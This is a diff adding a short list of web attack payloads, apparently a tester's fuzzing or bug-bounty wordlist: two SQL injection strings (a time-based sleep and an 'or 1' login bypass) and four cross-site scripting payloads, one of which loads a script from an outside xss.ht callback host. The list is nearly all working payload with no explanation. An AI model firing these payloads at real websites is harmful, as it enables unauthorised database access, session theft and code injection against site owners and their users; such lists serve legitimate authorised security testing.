@@ -1,0 +1,6 @@
+sql -sleep(10) -- -
+sql ' or 1 -- -;
+xss '"><a href='javascript:alert("xss")'>
+xss ><script src=https://lamscun.xss.ht></script>
+xss ><img src=x onerror=alert(1)>
+xss '"><a href='javascript:alert()'>
